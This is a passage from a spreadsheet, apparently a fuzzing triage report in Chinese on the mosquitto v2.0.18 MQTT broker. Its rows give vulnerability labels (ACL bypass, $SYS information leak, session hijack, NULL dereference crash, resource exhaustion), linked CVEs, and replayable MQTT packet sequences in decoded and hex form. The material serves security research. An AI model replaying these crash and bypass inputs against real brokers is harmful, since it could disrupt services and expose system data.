        <f>== 种子标识: id:000009,sev:3,cat:0206 ===\u000a大小: 1081B (报告+请求数据)\u000a请求数据: 299B\u000a\u000a---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MQTT请求序列(299B原始二进制) ---\u000aMsg[1]: PUBREL PacketID=4 | raw_header=621300044d5154540402003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['sensor/+/temp'(QoS=0)] | raw_header=82120001000d73656e736f722f2b2f74\u000aMsg[3]: TYPE0  | raw_header=0000\u000aMsg[4]: PUBLISH Topic='\x84uzz_\x00ñtmp\x82V\x00\x8b0\x0b\x99Óä[&amp;\x00\u0009a/b/c/d/e\x00\x1d$SYS/broker/clients/' QoS=0 retain=False payload_len=66B | raw_header=30fa00003684757a7a5f00f1746d7082\u000aMsg[5]: TYPE0  | raw_header=00062b2f64617461\u000aMsg[6]: TYPE0  | raw_header=0900\u000aMsg[7]: TYPE0  | raw_header=0601f6\u000aMsg[8]: AUTH  | raw_header=fc4f90e203002b766572792f64656570\u000aMsg[9]: (不完整,37B) raw=5e756b2b0be122543789af8500012e353211000c636d642f6c696768742f6f6e000531e000\u000a(尾部37B): 5e756b2b0be122543789af8500012e353211000c636d642f6c696768742f6f6e000531e000</f>
        <v/>
      </c>
      <c r="F1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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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1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13">
      <c r="A113" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:020e</t>
        </is>
      </c>
      <c r="B113" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C113" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(252B)\u000a4.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113" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:020e ===\u000a大小: 976B (报告+请求数据)\u000a请求数据: 252B\u000a\u000a---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MQTT请求序列(252B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(17481B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540402003c44495343\u000aMsg[2]: SUBSCRIBE PacketID=1990 Topics=['$SYS/broker+version'(QoS=1), '$SYS/broker/version'(QoS=2), 't'(QoS=0)] | raw_header=823207c60013245359532f62726f6b65\u000aMsg[3]: SUBSCRIBE PacketID=2208 Topics=['$share/grp2/sensor/#'(QoS=2), '$share/grpl/topic\x00\x08wi'(QoS=0)] | raw_header=827f08a000142473686172652f677270\u000aMsg[4]: TYPE0  | raw_header=000961666c6e65745f6330\u000aMsg[5]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=0)] | raw_header=820b00010006746573742f2300\u000aMsg[6]: PUBLISH Topic='\x00\x04MQTT\x04\x02\x00&lt;' QoS=1 retain=False payload='\x00\u0009aelio' | raw_header=3213000a00044d5154540402003c0009\u000aMsg[7]: TYPE0  | raw_header=0001df\u000aMsg[8]: PINGREQ  | raw_header=c000</f>
        <v/>
      </c>
      <c r="F1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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J11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1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14">
      <c r="A114" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B114" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C114" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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114" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0286 ===\u000a大小: 850B (报告+请求数据)\u000a请求数据: 175B\u000a\u000a---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MQTT请求序列(175B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=17 Topics=[] | raw_header=823e0011180be5d2be7926000d247368\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=67B | raw_header=3d580013245359532f62726f6b65722f\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=['\x01\x00\u000dsensor/+/t'(QoS=3)] | raw_header=82120001000d01000d73656e736f722f\u000aMsg[4]: DISCONNECT 断开连接 | raw_header=e8</f>
        <v/>
      </c>
      <c r="F1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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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15">
      <c r="A115" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:028e</t>
        </is>
      </c>
      <c r="B115" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C115" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(53B)\u000a4.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0x028e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E115" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:028e ===\u000a大小: 927B (报告+请求数据)\u000a请求数据: 53B\u000a\u000a---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CVE=CVE-2023-3592)\u000a【Sev2】MQTT: Duplicate packet identifier (replay/session hijack) (Cat=0x0204 Hash=0xcc642ed8 CVE=N/A)\u000a\u000a--- MQTT请求序列(53B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=95 Topics=[] | raw_header=8215005f6d7367310d0006245359532f\u000aMsg[2]: TYPE0  | raw_header=0200\u000aMsg[3]: (不完整,28B) raw=1162020012742f2300300d0006746573742f616866757a82d000e000\u000a(尾部28B): 1162020012742f2300300d0006746573742f616866757a82d000e000</f>
        <v/>
      </c>
      <c r="F1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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J11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1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16">
      <c r="A116" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:02c4</t>
        </is>
      </c>
      <c r="B116" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C116" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(299B)\u000a4.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116" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c4 ===\u000a大小: 833B (报告+请求数据)\u000a请求数据: 299B\u000a\u000a---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MQTT请求序列(299B原始二进制) ---\u000aMsg[1]: CONNACK  | raw_header=2600\u000aMsg[2]: TYPE0  | raw_header=00406519c90526262626262626262626\u000aMsg[3]: UNSUBACK  | raw_header=bd262626262626262626262626262626\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=26362626262626262680002626262626\u000aMsg[5]: PINGREQ  | raw_header=c000\u000aMsg[6]: PUBLISH Topic='senÿor/room1/temp' QoS=0 retain=False payload='22.5' | raw_header=3017001173656eff6f722f726f6f6d31\u000aMsg[7]: PUBLISH Topic='cm&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;' QoS=1 retain=False payload='&amp;&amp;6' | raw_header=3211000c636d26262626262626262626\u000aMsg[8]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[9]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262600\u000aMsg[10]: (不完整,9B) raw=26260020380f262626\u000a(尾部9B): 26260020380f262626</f>
        <v/>
      </c>
      <c r="F1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1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16" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J11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1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17">
      <c r="A117" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:02c6</t>
        </is>
      </c>
      <c r="B117" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C117" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(14136B)\u000a4.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117" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:02c6 ===\u000a大小: 4948B (报告+请求数据)\u000a请求数据: 14136B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: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MQTT请求序列(14136B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1243 Topics=['$sh\x10re/gr&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;'(QoS=2)] | raw_header=821d04db00142473681072652f677226\u000aMsg[2]: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CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1d262626262626262626262626262626\u000aMsg[15]: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raw_header=26262626262626262626262626262626\u000a(尾部3148B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F1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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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1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18">
      <c r="A118" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0305</t>
        </is>
      </c>
      <c r="B118" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C118" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(2078B)\u000a4.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118" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0305 ===\u000a大小: 2861B (报告+请求数据)\u000a请求数据: 2078B\u000a\u000a---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MQTT请求序列(2078B原始二进制) ---\u000aMsg[1]: CONNECT Proto=ÿÿ\x80\x00\x05\x1euzz_\x176\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x82\x12\x00 v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10250019ffff8000051e757a7a5f1736\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: TYPE0  | raw_header=0303030303\u000aMsg[4]: TYPE0  | raw_header=0303030303\u000aMsg[5]: TYPE0  | raw_header=030303fc02\u000aMsg[6]: TYPE0  | raw_header=0303030303\u000aMsg[7]: TYPE0  | raw_header=0300\u000aMsg[8]: PUBCOMP PacketID=57092 | raw_header=7465df04008200000000100000000000\u000aMsg[9]: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raw_header=0000\u000a(尾部1878B): 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</f>
        <v/>
      </c>
      <c r="F1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1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18" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J11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1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19">
      <c r="A119" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0306</t>
        </is>
      </c>
      <c r="B119" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C119" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(970B)\u000a4.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0x0306\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E119" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0306 ===\u000a大小: 3115B (报告+请求数据)\u000a请求数据: 970B\u000a\u000a---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MQTT请求序列(970B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540402003c00008075\u000aMsg[2]: PUBREL PacketID=83 | raw_header=62110053554253435249424520503838\u000aMsg[3]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=387f3838383838383838383838383838\u000aMsg[4]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[5]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[6]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[7]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[8]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[9]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[10]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[11]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[12]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[13]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[14]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[15]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[16]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=38383838383838383838383838383838\u000aMsg[17]: (不完整,47B) raw=32516f533d3101000d73656e736f722f2b2f7a656d7000c0003017161173656e736f722f726f6f6d\u000a(尾部47B): 32516f533d3101000d73656e736f722f2b2f7a656d7000c0003017161173656e736f722f726f6f6d312f74656d7032</f>
        <v/>
      </c>
      <c r="F1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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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1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20">
      <c r="A120" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:0385</t>
        </is>
      </c>
      <c r="B120" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C120" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(167B)\u000a4.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0x0385\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E120" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:0385 ===\u000a大小: 1224B (报告+请求数据)\u000a请求数据: 167B\u000a\u000a---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MQTT请求序列(167B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQU\x00 v0 ClientID=''(0B) clean_session=False keepalive=32768s [持久会话] | raw_header=101300044d5155000000800000000001\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=['senso////////'(QoS=3)] | raw_header=82120001000d73656e736f2f2f2f2f2f\u000aMsg[3]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f\u000aMsg[4]: CONNACK session_present=47 reason_code=47 | raw_header=2f2f2f2f2f2f2f2f2f2f2f722f2b2f74\u000aMsg[5]: (不完整,28B) raw=2f2f2f2f2f003032110025636d7a2f84000000642f6f6e000531e200\u000a(尾部28B): 2f2f2f2f2f003032110025636d7a2f84000000642f6f6e000531e200</f>
        <v/>
      </c>
      <c r="F1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20" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J1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2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21">
      <c r="A121" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:038e</t>
        </is>
      </c>
      <c r="B121" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C121" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000009,sev:3,cat:038e)中的REQUEST DATA提取出来(246B)\u000a4.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0x038e\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E121" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:038e ===\u000a大小: 1629B (报告+请求数据)\u000a请求数据: 246B\u000a\u000a---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MQTT请求序列(246B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=102200044d51545404c2003c00000009\u000aMsg[2]: SUBSCRIBE PacketID=25616 Topics=['$SYS/#'(QoS=0)] | raw_header=820b64100006245359532f2300\u000aMsg[3]: PUBLISH Topic='sensor/temp/room1' QoS=1 retain=False payload='\x00\x11{"temp":22.5}' | raw_header=3222001173656e736f722f74656d702f\u000aMsg[4]: PUBLISH Topic='home/+/status' QoS=2 retain=True payload='\x00\x12\x00\x01\x02\x03' | raw_header=3515000d686f6d652f2b2f7374617475\u000aMsg[5]: PUBLISH Topic='device/+/telemetry/#' QoS=0 retain=False payload='' | raw_header=301600146465766963652f2b2f74656c\u000aMsg[6]: PUBLISH Topic='/' QoS=1 retain=True payload_len=106B | raw_header=336d00012f0014414141414141414141\u000aMsg[7]: (不完整,3B) raw=c0e000\u000a(尾部3B): c0e000</f>
        <v/>
      </c>
      <c r="F1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2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21" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J12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2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22">
      <c r="A122" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:3,cat:038f</t>
        </is>
      </c>
      <c r="B122" s="2" t="inlineStr">
        <is>
          <t>信息泄露漏洞 - $SYS主题通配符订阅返回系统数据</t>
        </is>
      </c>
      <c r="C122" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类: mosquitto $SYS主题信息泄露)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000009,sev:3,cat:038f)中的REQUEST DATA提取出来(298B)\u000a4.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0x038f\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E122" s="2">
        <f>== 种子标识: id:000009,sev:3,cat:038f ===\u000a大小: 1561B (报告+请求数据)\u000a请求数据: 298B\u000a\u000a---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MQTT请求序列(298B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQÂü v60 ClientID=''(0B) clean_session=False keepalive=60s [持久会话] | raw_header=102200044d51c2fc3c00003c00000009\u000aMsg[2]: SUBSCRIBE PacketID=16 Topics=['$SYS/#'(QoS=0)] | raw_header=820b00100006245359532f2300\u000aMsg[3]: PUBLISH Topic='sensor/temp/room1' QoS=1 retain=False payload='\x00\x11{"temp"@22.5}' | raw_header=3222001173656e736f722f74656d702f\u000aMsg[4]: PUBLISH Topic='home/+/status' QoS=2 retain=True payload='\x00\x12\x00\x01\x02\x03' | raw_header=3515000d686f6d652f2b2f7374617475\u000aMsg[5]: PUBLISH Topic='?' QoS=0 retain=False payload='' | raw_header=3016001a646541414141414141414141\u000aMsg[6]: PUBLISH Topic='/' QoS=1 retain=True payload_len=106B | raw_header=336d00012f0014414141414141414141\u000aMsg[7]: (不完整,55B) raw=4141414141414141414141414141414141414141413d4141414141414141414141c000e0702f7200\u000a(尾部55B): 4141414141414141414141414141414141414141413d4141414141414141414141c000e0702f720080ffff00117b2274656d</f>
        <v/>
      </c>
      <c r="F1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2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22" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(敏感信息泄露)</t>
        </is>
      </c>
      <c r="J12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12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123">
      <c r="A123" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B123" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C123" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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23" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0040 ===\u000a大小: 709B (报告+请求数据)\u000a请求数据: 19B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(19B原始二进制) ---\u000aMsg[1]: (不完整,19B) raw=822c826c000000000000002300127f00800063\u000a(尾部19B): 822c826c000000000000002300127f00800063</f>
        <v/>
      </c>
      <c r="F1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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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4">
      <c r="A124" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B124" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C124" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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24" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0042 ===\u000a大小: 654B (报告+请求数据)\u000a请求数据: 130B\u000a\u000a---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MQTT请求序列(130B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=80 Topics=[''(零长度!QoS=2), '$share/grp/test/topic'(QoS=0), '$SYS/broker/version'(QoS=2)] | raw_header=8233005000000200152473686172652f\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=42B | raw_header=3449001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=011d\u000a(尾部2B): 011d</f>
        <v/>
      </c>
      <c r="F1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24" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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25">
      <c r="A125" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B125" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C125" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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25" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c0 ===\u000a大小: 972B (报告+请求数据)\u000a请求数据: 95B\u000a\u000a---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MQTT请求序列(95B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=56 Topics=['home/+/temperature'(QoS=2), ''(零长度!QoS=2)] | raw_header=821a00380012686f6d652f2b2f74656d\u000aMsg[2]: PUBLISH Topic='$share/grp1/test/+' QoS=1 retain=True payload='\x009[\x88\×fk\x81§~)TÞøQ\x03Å\x86ôù\x1ci¯9\x03ê&gt;.\x91&gt;Lö\x99ÕSp;¾' | raw_header=3b3b00122473686172652f677270312f\u000aMsg[3]: (不完整,6B) raw=c01b042f0040\u000a(尾部6B): c01b042f0040</f>
        <v/>
      </c>
      <c r="F1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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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6">
      <c r="A126" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B126" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C126" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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26" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:00c2 ===\u000a大小: 1173B (报告+请求数据)\u000a请求数据: 169B\u000a\u000a---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MQTT请求序列(169B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1588 Topics=[''(零长度!QoS=3)] | raw_header=82190634000013245359532f62726f6b\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=107B | raw_header=398a01001d245359532f62726f6b6572\u000aMsg[3]: PUBACK  | raw_header=4e</f>
        <v/>
      </c>
      <c r="F1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26" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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27">
      <c r="A127" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:0140</t>
        </is>
      </c>
      <c r="B127" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C127" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(657B)\u000a4.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127" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0140 ===\u000a大小: 1376B (报告+请求数据)\u000a请求数据: 657B\u000a\u000a---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MQTT请求序列(657B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s [自动清理会话] | raw_header=102200044d51545404c2003c00000009\u000aMsg[2]: SUBSCRIBE PacketID=0 Topics=[''(零长度!QoS=3)] | raw_header=820b000000007f5359534d5154\u000aMsg[3]: PUBREC PacketID=49664 | raw_header=5404c2003c00\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: TYPE0  | raw_header=0966757a7a5f75738700000966757a7a\u000aMsg[6]: PUBCOMP PacketID=5376 | raw_header=7d3515000d686f6d652f2b2f73746174\u000aMsg[7]: PUBACK PacketID=16705 | raw_header=41414141414141414141414141414141\u000aMsg[8]: PUBCOMP PacketID=28016 | raw_header=74656d702f726f6f6d3100117b225965\u000aMsg[9]: PUBCOMP PacketID=12067 | raw_header=72792f23336d00012f00144141414141\u000aMsg[10]: PUBCOMP PacketID=29440 | raw_header=74757300120001020330160014646576\u000aMsg[11]: (不完整,29B) raw=414141414141414141414141414141414141414141414141416500e000\u000a(尾部29B): 414141414141414141414141414141414141414141414141416500e000</f>
        <v/>
      </c>
      <c r="F1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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J12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8">
      <c r="A128" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_2.tar.gz/replayable-violations/id:000009,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B128" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C128" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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0x0141\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E128" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0141 ===\u000a大小: 927B (报告+请求数据)\u000a请求数据: 41B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: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MQTT请求序列(41B原始二进制) ---\u000aMsg[1]: CONNECT Proto=M®«\x80 v0 ClientID=''(0B) clean_session=False keepalive=56s [持久会话] | raw_header=101300044daeab800000003800000175\u000aMsg[2]: SUBSCRIBE PacketID=156 Topics=[''(零长度!QoS=0)] | raw_header=8212009c000000656e736f722f2b2f74</f>
        <v/>
      </c>
      <c r="F1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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J12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29">
